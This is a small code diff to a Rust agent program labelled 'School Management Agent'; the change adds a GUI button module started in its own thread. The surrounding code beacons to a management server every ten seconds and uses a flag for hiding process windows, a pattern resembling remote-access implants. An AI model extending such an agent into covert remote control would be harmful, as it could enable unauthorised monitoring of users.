@@ -8,6 +8,8 @@ use std::env;
 #[cfg(windows)]
 use std::os::windows::process::CommandExt;
 
+mod gui_button;
+
 const BEACON_INTERVAL: u64 = 10;
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -549,6 +551,10 @@ async fn main() {
     let server_url = get_server_url();
     println!("[*] School Management Agent starting...");
     println!("[*] Management Server: {}", server_url);
+    
+    // Start GUI button window in a separate thread
+    gui_button::start_gui_thread();
+    println!("[+] GUI button window started");
     
     let client = reqwest::Client::new();
     let mut state = AgentState::new();
